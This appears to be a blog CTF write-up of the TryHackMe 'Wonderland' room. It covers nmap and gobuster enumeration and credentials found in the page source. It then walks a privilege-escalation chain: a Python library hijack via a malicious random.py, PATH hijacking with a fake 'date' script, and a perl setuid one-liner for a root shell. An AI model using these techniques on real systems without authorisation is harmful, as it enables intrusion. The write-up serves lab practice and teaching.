---
title: "TryHackMe - Wonderland"
author: Nasrallah
description: ""
date: 2022-07-19 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, privesc, python, gobuster, hijacking, getcap]
img_path: /assets/img/tryhackme/wonderland/
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Wonderland](https://tryhackme.com/room/wonderland) from [TryHackMe](https://tryhackme.com). It's a medium machine running a webserver and ssh. After some enumeration we find some ssh credentials on a page. After getting access to the machine we start a series of privilege escalation where we use different techniques until we get root.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.236.134
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports, 22(SSH) and 80(HTTP).

## Web

Navigate to the webpage.

![](1.png)

We have to follow the rabbit the page says.

## Gobuster

Let's run a directory scan with gobuster: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.10/`.

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.111.173/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
 07:35:49 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]  
/r                    (Status: 301) [Size: 0] [--> r/]  
===============================================================
```

Found **/r** directory.

![](2.png)

Got to keep going, so let's run another scan this time in the **/r** directory.`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.10/r/`

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.236.134/r/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
 10:56:52 Starting gobuster in directory enumeration mode
===============================================================
/a                    (Status: 200) [Size: 264]
/index.html           (Status: 200) [Size: 258]
===============================================================
```

Found another directory named **/a**

![](3.png)

Same message as before.

We keep doing running scans until we end up with **/r/a/b/b/i/t**.

![](4.png)

Nothing really helpful in this page, let's look at the source code `ctrl + U`.

![](5.png)

Nice! We found alice's credentials.


# **Foothold**

Let's use that username and password and login via ssh.

![](6.png)


# **Privilege Escalation**

## Alice

Let's check our current privileges with `sudo -l`

![](7.png)

There is a python script located in our home directory we can run as `rabbit`, Let's run it and see what it does.

![](8.png)

Every time we run it, it prints 10 random lines. Let's check the source code.

```python
import random                                                                                                                                                 
poem = """The sun was shining on the sea,                                                                                                                     
Shining with all his might:                                                                                                                                   
He did his very best to make                                                                                                                                  
The billows smooth and bright —                                                                                                                               
And this was odd, because it was                                                                                                                              
The middle of the night.                                                                                                                                      
                                                                                                                                                              
The moon was shining sulkily,                                                                                                                                 
Because she thought the sun                                                                                                                                   
Had got no business to be there                                                                                                                               
After the day was done —                                                                                                                                      
"It’s very rude of him," she said,                                                                                                                            
"To come and spoil the fun!"

< **SNIP**>

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)

```

The script call the `random` library at the first line, and then calls it later at the end.

Since the script is in our directory, we can use a technique called `library hijacking`. The way this technique works is when importing a module within a script, Python will search that module file through some predefined directories in a specific order of priority, and it will pick the first occurrence, more about this topic in this [article](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8). The first place python usually looks is in the script current directory, so we can write a malicious python script named `random.py` and it will be imported by the other script.

The python script we will be using is the following:

```python
import os; os.system("/bin/bash")
```
>This will spawn a shell

Put that script in a file and name it random.py, when we execute the walrus_and_the_carpenter.py script as `rabbit`, we will get a shell as rabbit.

![](9.png)

## Rabbit

Let's go the rabbit's home directory.

![](10.png)

There a binary with suid bit.

![](11.png)

When we run the program, we get prompt for an input and then it segfaults.

But on important things we see is a date being printed out. So the program must be calling `date` binary.

We can do something similar to the python library hijacking by adding our own `date` program into our home directory, and manipulate the `PATH` variable to find our binary.

Let's first make the binary.

```bash
echo '#!/bin/bash' > date
echo '/bin/bash' >> date
chmod +x date 
```

>This program will spawn a shell.

![](12.png)

Now we need to add our home directory to the path variable so that the program can find our date binary.

```bash
export PATH=/home/rabbit:$PATH
```

![](13.png)

Now if we run the `teaParty` program we should get a shell as another user.

![](14.png)

## Hatter

After some enumeration, we check the capabilities and find the following.

![](15.png)

There is `perl` with setuid capabilities. A quick search on [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities) we find a command that gives us root shell.

```bash
usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

![](16.png)

Run the command for a root shell.

![](17.png)

Congrats, we have successfully rooted the machine.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
